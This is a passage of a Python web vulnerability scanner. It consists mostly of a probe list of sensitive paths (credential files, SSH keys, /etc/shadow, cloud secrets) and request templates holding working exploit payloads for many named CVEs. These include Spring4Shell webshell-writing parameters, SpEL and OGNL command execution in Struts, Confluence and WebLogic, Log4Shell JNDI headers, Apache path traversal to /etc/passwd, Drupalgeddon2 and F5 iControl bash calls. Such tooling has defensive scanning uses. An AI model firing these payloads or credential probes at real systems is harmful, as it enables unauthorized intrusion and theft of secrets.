#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import concurrent.futures
import os
import re
import shutil
import socket
import ssl
import subprocess
import time
import urllib.parse
from collections import deque
from datetime import datetime
from typing import Dict, List, Optional, Set

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

try:
    from tqdm import tqdm
except ImportError:
    def tqdm(x, **kw):
        return x

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
except ImportError:
    class Fore:
        CYAN = GREEN = YELLOW = RED = MAGENTA = ""
    class Style:
        RESET_ALL = BRIGHT = ""

CYAN = Fore.CYAN
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
RED = Fore.RED
MAGENTA = Fore.MAGENTA
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
]

BINARY_EXTENSIONS = {
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.ico', '.webp',
    '.mp3', '.mp4', '.avi', '.mov', '.wmv', '.flv', '.mkv', '.webm',
    '.woff', '.woff2', '.ttf', '.otf', '.eot',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz',
    '.exe', '.dll', '.so', '.dylib', '.bin', '.iso', '.dmg',
    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
}

SENSITIVE_PATHS = [
    ".env", ".env.local", ".env.prod", ".env.production", ".env.dev",
    ".env.development", ".env.staging", ".env.backup", ".env.old",
    ".env.save", ".env~", ".env.example", ".env.sample", ".env.test",
    ".env.bak", ".env.orig", ".env.swp", ".env.dist", ".env.ci",
    ".env.local.php", ".env.aws", ".env.gcp", ".env.azure",
    "config.php", "config.js", "config.json", "config.yml",
    "config.yaml", "config.xml", "config.ini", "config.cfg",
    "config.conf", "config.toml", "config.bak", "config.old",
    "config.save", "config.php.bak", "configuration.php",
    "settings.php", "settings.py", "settings.json", "app.config",
    "appsettings.json", "web.config", "local.settings.json",
    "appsettings.Development.json", "appsettings.Production.json",
    "appsettings.Staging.json", "appsettings.Local.json",
    "database.yml", "database.yaml", "database.json", "database.php",
    "db.php", "db.sql", "db.sqlite", "db.sqlite3", "dump.sql",
    "backup.sql", "backup.zip", "backup.tar.gz", "backup.tar",
    "database.sql", "data.sql", "mysql.sql", "postgres.sql",
    "db_backup.sql", "db_backup.zip", "db_dump.sql", "db_dump.gz",
    ".git/config", ".git/HEAD", ".git/index", ".git/logs/HEAD",
    ".git/refs/heads/master", ".git/refs/heads/main", ".gitignore",
    ".svn/entries", ".svn/wc.db", ".hg/store", ".hg/hgrc",
    ".bzr/README", "CVS/Entries", ".gitlab-ci.yml", ".travis.yml",
    ".git/COMMIT_EDITMSG", ".git/ORIG_HEAD", ".git/packed-refs",
    ".DS_Store", "Thumbs.db", "desktop.ini", ".htaccess",
    ".htpasswd", ".htgroups", ".ftpconfig", ".editorconfig",
    ".npmrc", ".yarnrc",
    "api.php", "api/v1/", "api/v2/", "api/v3/", "api/swagger.json",
    "swagger.json", "swagger.yaml", "openapi.json", "openapi.yaml",
    "api-docs", "api-docs.json", "graphql", "graphiql",
    "playground", "api/graphql", "api/health", "api/status",
    "api/info", "api/version", "redoc", "voyager", "graphql/console",
    "admin/", "administrator/", "admin.php", "admin.html",
    "admin/login", "wp-admin/", "wp-login.php", "wp-config.php",
    "wp-config.php.bak", "wp-content/debug.log",
    "wp-json/wp/v2/users", "xmlrpc.php", "administrator/index.php",
    "admin/login.php", "admin/index.php", "cpanel", "plesk",
    "webmail", "phpmyadmin", "pma", "mysql", "adminer.php",
    "adminer", "dbadmin", "sqladmin",
    "phpinfo.php", "info.php", "test.php", "debug.php", "php.php",
    "php_info.php", "i.php", "t.php", "temp.php", "tmp.php",
    "test.html", "test.txt", "debug.log", "error.log", "access.log",
    ".well-known/security.txt", ".well-known/change-password",
    ".well-known/openid-configuration", "robots.txt", "sitemap.xml",
    "sitemap_index.xml", "sitemap.gz", "humans.txt",
    "crossdomain.xml", "clientaccesspolicy.xml", "favicon.ico",
    "manifest.json",
    ".aws/credentials", ".aws/config", "aws-exports.js",
    "amplifyconfiguration.json", "service-account.json",
    "gcp-credentials.json", ".gcloud/", "azure-pipelines.yml",
    ".azure/", "app/config/parameters.yml", "config/secrets.yml",
    "config/credentials.yml.enc", "master.key", ".ssh/id_rsa",
    ".ssh/id_dsa", ".ssh/authorized_keys", ".ssh/known_hosts",
    "id_rsa", "id_dsa", "private.key", "private.pem", "server.key",
    "cert.pem", "cert.crt", "keystore.jks", "truststore.jks",
    "_ignition/health-check", "_ignition/execute-solution",
    "_debugbar/open", "_debugbar/", "_profiler/", "__debug__/",
    "actuator", "actuator/env", "actuator/health", "actuator/heapdump",
    "actuator/mappings", "actuator/beans", "actuator/configprops",
    "actuator/trace", "actuator/loggers", "actuator/threaddump",
    "actuator/gateway/routes", "actuator/caches", "actuator/conditions",
    "actuator/scheduledtasks", "actuator/httptrace",
    "actuator/prometheus", "actuator/metrics",
    "server-status", "server-info", "nginx_status", "stub_status",
    "metrics", "health", "healthz", "status", "ready", "live",
    "storage/logs/laravel.log", "vendor/laravel/", ".phpunit.result.cache",
    "telescope", "horizon", "nova",
    "static/admin/css/base.css", "media/", "accounts/login/",
    "config/database.yml", "config/credentials.yml.enc",
    "config/master.key", "storage/", "log/",
    "node_modules/", ".npmrc", ".yarnrc", "package-lock.json",
    "yarn.lock", "package.json",
    "Web.config", "appsettings.Development.json",
    "Properties/launchSettings.json",
    "composer.json", "composer.lock", "vendor/", "phpunit.xml",
    ".php-cs-fixer.cache",
    ".vscode/", ".vscode/settings.json", ".vscode/launch.json",
    ".idea/", ".idea/workspace.xml", ".idea/modules.xml",
    ".project", ".classpath",
    "Gemfile", "Gemfile.lock", "requirements.txt", "Pipfile",
    "Pipfile.lock", "pyproject.toml", "setup.py", "go.mod",
    "go.sum", "Cargo.toml", "Cargo.lock", "pom.xml", "build.gradle",
    "Dockerfile", "docker-compose.yml", "docker-compose.yaml",
    ".dockerignore", ".github/workflows/", "Jenkinsfile",
    ".circleci/config.yml",
    "backup/", "backups/", "bak/", "old/", "temp/", "tmp/",
    "cache/", "log/", "logs/", "archive/", "archives/",
    "export/", "exports/", "backup.tar", "backup.tgz",
    "backup.rar", "backup.7z", "site.zip", "www.zip", "web.zip",
    "html.zip", "public.zip", "database.zip", "db.zip", "sql.zip",
    "dump.zip", "export.zip",
    "k8s/", "kubernetes/", "deployment.yaml", "service.yaml",
    "ingress.yaml", "helm/", "Chart.yaml", "values.yaml",
    "terraform.tfstate", "terraform.tfvars", ".terraform/",
    "grafana/", "prometheus/", "sentry.properties", ".sentryclirc",
    "pgadmin/", "postgres/", "redis/", "redis-cli", "mongo/",
    "mongodb/", "_cat/indices", "_cluster/health", "_nodes",
    "_search", "_all",
    "server.php", "config.inc.php", "configuration.php.bak",
    "local.xml", "local.xml.bak", "env.php", "env", "env.txt",
    "credentials.json", "credentials.yml", "secrets.json",
    "secrets.yml", "tokens.json", "tokens.txt", "passwords.txt",
    "passwd", "shadow", "etc/passwd", "etc/shadow",
    "proc/self/environ", "windows/win.ini", "boot.ini",
    "web.config.bak", "global.asa", "global.asax",
    "readme.html", "readme.txt", "README.md", "CHANGELOG.md",
    "LICENSE", "TODO.md", "NOTES.md", "docs/", "documentation/",
    "manual/", "codeception.yml", "behat.yml", ".env.testing",
]

CVE_TEMPLATES = [
    {"name": "Laravel Ignition RCE", "path": "/_ignition/execute-solution",
     "method": "POST", "matcher_type": "body",
     "matcher_value": r'"(message|exception|solution|file)"',
     "severity": "CRITICAL", "cve_id": "CVE-2021-3129",
     "headers": {"Content-Type": "application/json", "Accept": "application/json"},
     "body": '{"solution":"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"test"}}',
     "exploit_available": True},
    {"name": "Laravel Debugbar", "path": "/_debugbar/open", "method": "GET",
     "matcher_type": "status", "matcher_value": [200],
     "severity": "MEDIUM", "cve_id": "",
     "body_regex": r"(debugbar|DebugBar)", "exploit_available": False},
    {"name": "Laravel Telescope", "path": "/telescope", "method": "GET",
     "matcher_type": "status", "matcher_value": [200, 302],
     "severity": "HIGH", "cve_id": "",
     "body_regex": r"(Telescope|telescope)", "exploit_available": False},
    {"name": "Spring4Shell", "path": "/", "method": "POST",
     "matcher_type": "status", "matcher_value": [200, 400, 500],
     "severity": "CRITICAL", "cve_id": "CVE-2022-22965",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "body": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
     "exploit_available": True},
    {"name": "Spring Cloud Function SpEL RCE", "path": "/functionRouter",
     "method": "POST", "matcher_type": "status",
     "matcher_value": [200, 500], "severity": "CRITICAL",
     "cve_id": "CVE-2022-22963",
     "headers": {"Content-Type": "text/plain",
                 "spring.cloud.function.routing-expression":
                     "T(java.lang.Runtime).getRuntime().exec('id')"},
     "exploit_available": True},
    {"name": "Spring Cloud Gateway SpEL RCE",
     "path": "/actuator/gateway/routes/test", "method": "POST",
     "matcher_type": "status", "matcher_value": [200, 201, 500],
     "severity": "CRITICAL", "cve_id": "CVE-2022-22947",
     "headers": {"Content-Type": "application/json"},
     "body": '{"id":"test","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new String(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream().readAllBytes())}"}}],"uri":"http://example.com","order":0}',
     "exploit_available": True},
    {"name": "Spring Boot Actuator", "path": "/actuator", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(actuator|_links|self)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Spring Boot Actuator Env", "path": "/actuator/env",
     "method": "GET", "matcher_type": "body",
     "matcher_value": r"(propertySources|systemProperties|activeProfiles)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Spring Boot Actuator Heapdump", "path": "/actuator/heapdump",
     "method": "GET", "matcher_type": "status", "matcher_value": [200],
     "severity": "CRITICAL", "cve_id": "", "exploit_available": False},
    {"name": "Log4Shell", "path": "/", "method": "GET",
     "matcher_type": "header",
     "matcher_value": {
         "X-Api-Version": "${jndi:ldap://127.0.0.1:1389/a}",
         "User-Agent": "${jndi:ldap://127.0.0.1:1389/a}",
         "X-Forwarded-For": "${jndi:ldap://127.0.0.1:1389/a}",
         "X-Client-IP": "${jndi:ldap://127.0.0.1:1389/a}",
         "X-Remote-IP": "${jndi:ldap://127.0.0.1:1389/a}",
         "X-Originating-IP": "${jndi:ldap://127.0.0.1:1389/a}",
         "X-Real-IP": "${jndi:ldap://127.0.0.1:1389/a}",
         "Referer": "${jndi:ldap://127.0.0.1:1389/a}",
         "Origin": "${jndi:ldap://127.0.0.1:1389/a}",
         "Cookie": "${jndi:ldap://127.0.0.1:1389/a}",
         "Authorization": "${jndi:ldap://127.0.0.1:1389/a}",
         "X-Druid-Comment": "${jndi:ldap://127.0.0.1:1389/a}"},
     "severity": "CRITICAL", "cve_id": "CVE-2021-44228",
     "exploit_available": True},
    {"name": "F5 BIG-IP iControl REST RCE", "path": "/mgmt/tm/util/bash",
     "method": "POST", "matcher_type": "status",
     "matcher_value": [200, 401, 403, 500], "severity": "CRITICAL",
     "cve_id": "CVE-2022-1388",
     "headers": {"X-F5-Auth-Token": "whatever",
                 "Authorization": "Basic YWRtaW46YWRtaW4=",
                 "Content-Type": "application/json"},
     "body": '{"command":"run","utilCmdArgs":"-c \'id\'"}',
     "exploit_available": True},
    {"name": "F5 BIG-IP TMUI RCE",
     "path": "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp",
     "method": "GET", "matcher_type": "status",
     "matcher_value": [200, 500], "severity": "CRITICAL",
     "cve_id": "CVE-2020-5902", "exploit_available": True},
    {"name": "F5 BIG-IP iControl REST (2021)", "path": "/mgmt/tm/util/bash",
     "method": "POST", "matcher_type": "status",
     "matcher_value": [200, 401, 403], "severity": "CRITICAL",
     "cve_id": "CVE-2021-22986",
     "headers": {"X-F5-Auth-Token": "whatever",
                 "Authorization": "Basic YWRtaW46YWRtaW4=",
                 "Content-Type": "application/json"},
     "body": '{"command":"run","utilCmdArgs":"-c \'id\'"}',
     "exploit_available": True},
    {"name": "Apache Path Traversal",
     "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
     "method": "GET", "matcher_type": "body",
     "matcher_value": r"root:x:0:0", "severity": "CRITICAL",
     "cve_id": "CVE-2021-41773", "exploit_available": True},
    {"name": "Apache Path Traversal (2.4.50)",
     "path": "/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
     "method": "GET", "matcher_type": "body",
     "matcher_value": r"root:x:0:0", "severity": "CRITICAL",
     "cve_id": "CVE-2021-42013", "exploit_available": True},
    {"name": "Apache Server Status", "path": "/server-status",
     "method": "GET", "matcher_type": "body",
     "matcher_value": r"(Apache Server Status|server-status)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Apache Server Info", "path": "/server-info", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(Apache Server Information|server-info)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Struts2 S2-045", "path": "/", "method": "GET",
     "matcher_type": "header",
     "matcher_value": {
         "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"},
     "severity": "CRITICAL", "cve_id": "CVE-2017-5638",
     "exploit_available": True},
    {"name": "WebLogic Console", "path": "/console/login/LoginForm.jsp",
     "method": "GET", "matcher_type": "body",
     "matcher_value": r"(WebLogic|Oracle WebLogic)",
     "severity": "HIGH", "cve_id": "CVE-2020-14882",
     "exploit_available": True},
    {"name": "WebLogic Console RCE",
     "path": "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22)",
     "method": "GET", "matcher_type": "body",
     "matcher_value": r"uid=\d+", "severity": "CRITICAL",
     "cve_id": "CVE-2020-14882", "exploit_available": True},
    {"name": "Drupalgeddon2",
     "path": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
     "method": "POST", "matcher_type": "status",
     "matcher_value": [200, 500], "severity": "CRITICAL",
     "cve_id": "CVE-2018-7600",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "body": "mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id",
     "exploit_available": True},
    {"name": "PHP-FPM Underflow", "path": "/index.php", "method": "GET",
     "matcher_type": "header",
     "matcher_value": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
     "severity": "CRITICAL", "cve_id": "CVE-2019-11043",
     "exploit_available": True},
    {"name": "Tomcat Manager", "path": "/manager/html", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Tomcat|Manager Application)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Jenkins Script Console", "path": "/script", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Jenkins|Script Console)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "phpMyAdmin", "path": "/phpmyadmin/", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(phpMyAdmin|pma_)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Grafana", "path": "/login", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Grafana|grafana)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Kibana", "path": "/app/kibana", "method": "GET",
     "matcher_type": "status", "matcher_value": [200, 302],
     "severity": "MEDIUM", "cve_id": "",
     "body_regex": r"(kibana|Kibana)", "exploit_available": False},
    {"name": "Elasticsearch", "path": "/_cat/indices", "method": "GET",
     "matcher_type": "status", "matcher_value": [200],
     "severity": "HIGH", "cve_id": "",
     "body_regex": r"(green|yellow|red)", "exploit_available": False},
    {"name": "MongoDB Web", "path": "/", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(mongodb|MongoDB)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Redis Web", "path": "/", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(redis|Redis)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Jupyter Notebook", "path": "/tree", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Jupyter|jupyter)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Airflow", "path": "/admin/", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Airflow|airflow)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
        {"name": "GitLab", "path": "/users/sign_in", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(GitLab|gitlab)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "WordPress xmlrpc", "path": "/xmlrpc.php", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(XML-RPC|xmlrpc)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Magento", "path": "/admin", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Magento|magento)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Joomla Admin", "path": "/administrator/", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Joomla|joomla)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Confluence OGNL Injection",
     "path": "/%24%7B%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29.%28%23a%29%7D/",
     "method": "GET", "matcher_type": "body",
     "matcher_value": r"uid=\d+", "severity": "CRITICAL",
     "cve_id": "CVE-2022-26134", "exploit_available": True},
    {"name": "Confluence Privilege Escalation", "path": "/server-info.action",
     "method": "POST", "matcher_type": "status",
     "matcher_value": [200, 302], "severity": "CRITICAL",
     "cve_id": "CVE-2023-22515",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "body": "username=admin&fullName=admin&email=admin@example.com&password=admin&confirm=admin",
     "exploit_available": False},
    {"name": "Citrix Bleed",
     "path": "/oauth/idp/.well-known/openid-configuration",
     "method": "GET", "matcher_type": "body",
     "matcher_value": r"(issuer|authorization_endpoint|token_endpoint)",
     "severity": "CRITICAL", "cve_id": "CVE-2023-4966",
     "exploit_available": False},
    {"name": "Citrix ADC Path Traversal",
     "path": "/vpn/../vpns/cfg/smb.conf", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(global|workgroup|encrypt passwords)",
     "severity": "CRITICAL", "cve_id": "CVE-2019-19781",
     "exploit_available": True},
    {"name": "Ivanti Connect Secure RCE",
     "path": "/api/v1/totp/user-backup-code/../../system/system-information",
     "method": "GET", "matcher_type": "body",
     "matcher_value": r"(system-information|Ivanti)",
     "severity": "CRITICAL", "cve_id": "CVE-2024-21887",
     "exploit_available": False},
    {"name": "Palo Alto GlobalProtect RCE",
     "path": "/ssl-vpn/hipreport.esp", "method": "POST",
     "matcher_type": "status", "matcher_value": [200, 500],
     "severity": "CRITICAL", "cve_id": "CVE-2024-3400",
     "headers": {"Content-Type": "application/x-www-form-urlencoded",
                 "Cookie": "SESSID=../../../../../var/appweb/sslvpndocs/global-protect/portal/images/test.txt"},
     "body": "user=test&portal=test&domain=test&computer=test&client-version=test",
     "exploit_available": True},
    {"name": "MOVEit Transfer SQLi", "path": "/human.aspx?r=...",
     "method": "GET", "matcher_type": "status",
     "matcher_value": [200, 500], "severity": "CRITICAL",
     "cve_id": "CVE-2023-34362", "exploit_available": False},
    {"name": "Fortinet FortiOS Auth Bypass",
     "path": "/api/v2/cmdb/system/admin", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(admin|username|user_type)",
     "severity": "CRITICAL", "cve_id": "CVE-2022-40684",
     "exploit_available": True},
    {"name": "VMware vCenter RCE",
     "path": "/ui/vropspluginui/rest/services/uploadova",
     "method": "POST", "matcher_type": "status",
     "matcher_value": [200, 500], "severity": "CRITICAL",
     "cve_id": "CVE-2021-21972", "exploit_available": True},
    {"name": "Exchange ProxyLogon", "path": "/ecp/default.flt",
     "method": "GET", "matcher_type": "status",
     "matcher_value": [200, 500], "severity": "CRITICAL",
     "cve_id": "CVE-2021-26855", "exploit_available": True},
    {"name": "Exchange ProxyNotShell",
     "path": "/autodiscover/autodiscover.json?@test.com/owa/&Email=autodiscover/autodiscover.json%3F@test.com",
     "method": "GET", "matcher_type": "status",
     "matcher_value": [200, 500], "severity": "CRITICAL",
     "cve_id": "CVE-2022-41040", "exploit_available": False},
    {"name": "Joomla Unauthorized Access",
     "path": "/api/index.php/v1/config/application?public=true",
     "method": "GET", "matcher_type": "body",
     "matcher_value": r"(sitename|dbtype|host|user|password)",
     "severity": "CRITICAL", "cve_id": "CVE-2023-23752",
     "exploit_available": False},
    {"name": "Adobe ColdFusion RCE",
     "path": "/CFIDE/adminapi/administrator.cfc?method=login",
     "method": "POST", "matcher_type": "status",
     "matcher_value": [200, 500], "severity": "CRITICAL",
     "cve_id": "CVE-2023-26360", "exploit_available": False},
    {"name": "GitLab RCE", "path": "/uploads/user/", "method": "POST",
     "matcher_type": "status", "matcher_value": [200, 500],
     "severity": "CRITICAL", "cve_id": "CVE-2021-22205",
     "exploit_available": False},
    {"name": "ScreenConnect Auth Bypass", "path": "/SetupWizard.aspx/",
     "method": "GET", "matcher_type": "body",
     "matcher_value": r"(Setup Wizard|ScreenConnect|ConnectWise)",
     "severity": "CRITICAL", "cve_id": "CVE-2024-1709",
     "exploit_available": True},
    {"name": "TeamCity Auth Bypass",
     "path": "/app/rest/users/id:1/tokens/", "method": "POST",
     "matcher_type": "status", "matcher_value": [200, 201, 500],
     "severity": "CRITICAL", "cve_id": "CVE-2024-27198",
     "exploit_available": False},
    {"name": "Apache Commons Text RCE",
     "path": "/?search=${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
     "method": "GET", "matcher_type": "body",
     "matcher_value": r"uid=\d+", "severity": "CRITICAL",
     "cve_id": "CVE-2022-42889", "exploit_available": True},
    {"name": "Nginx Stub Status", "path": "/nginx_status", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(Active connections|server accepts)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Symfony Profiler", "path": "/_profiler/", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(Symfony|symfony|profiler)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Django Debug", "path": "/__debug__/", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(Django|django|debug)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Laravel Horizon", "path": "/horizon", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Horizon|horizon)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Laravel Nova", "path": "/nova", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Nova|nova)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Symfony Debug Toolbar",
     "path": "/_wdt/", "method": "GET",
     "matcher_type": "status", "matcher_value": [200, 404],
     "severity": "MEDIUM", "cve_id": "",
     "body_regex": r"(Symfony|symfony)", "exploit_available": False},
    {"name": "Rails Dev Mode",
     "path": "/rails/info/properties", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Rails|Ruby)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Rails Routes",
     "path": "/rails/info/routes", "method": "GET",
     "matcher_type": "status", "matcher_value": [200],
     "severity": "HIGH", "cve_id": "",
     "body_regex": r"(routes|controller|action)",
     "exploit_available": False},
    {"name": "Next.js Config",
     "path": "/_next/static/", "method": "GET",
     "matcher_type": "status", "matcher_value": [200],
     "severity": "LOW", "cve_id": "", "exploit_available": False},
    {"name": "Docker Registry API",
     "path": "/v2/_catalog", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(repositories|Repositories)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Kubernetes API",
     "path": "/api/v1/namespaces", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(kind|apiVersion|items)",
     "severity": "CRITICAL", "cve_id": "", "exploit_available": False},
    {"name": "Kubernetes Dashboard",
     "path": "/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/",
     "method": "GET", "matcher_type": "body",
     "matcher_value": r"(Kubernetes|Dashboard)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Prometheus",
     "path": "/-/healthy", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Prometheus|Healthy)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Sentry",
     "path": "/api/0/", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Sentry|sentry)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Rundeck",
     "path": "/menu/home", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Rundeck|rundeck)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "SonarQube",
     "path": "/api/system/status", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(SonarQube|sonarqube|status)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Zabbix",
     "path": "/zabbix.php?action=dashboard.view", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Zabbix|zabbix)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Nagios",
     "path": "/nagios/", "method": "GET",
     "matcher_type": "body", "matcher_value": r"(Nagios|nagios)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "RabbitMQ Management",
     "path": "/api/overview", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(rabbitmq_version|management_version)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "InfluxDB",
     "path": "/ping", "method": "GET",
     "matcher_type": "status", "matcher_value": [200, 204],
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Consul",
     "path": "/v1/agent/self", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(Config|Member|DebugConfig)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Vault",
     "path": "/v1/sys/health", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(initialized|sealed|standby)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "MinIO Console",
     "path": "/minio/health/live", "method": "GET",
     "matcher_type": "status", "matcher_value": [200],
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Grafana Health",
     "path": "/api/health", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(database|version|commit)",
     "severity": "MEDIUM", "cve_id": "", "exploit_available": False},
    {"name": "Jenkins API",
     "path": "/api/json", "method": "GET",
     "matcher_type": "body",
     "matcher_value": r"(_class|Jenkins|jobs)",
     "severity": "HIGH", "cve_id": "", "exploit_available": False},
    {"name": "Nexus Repository",
     "path": "/service/rest/v1/status", "method": "GET",
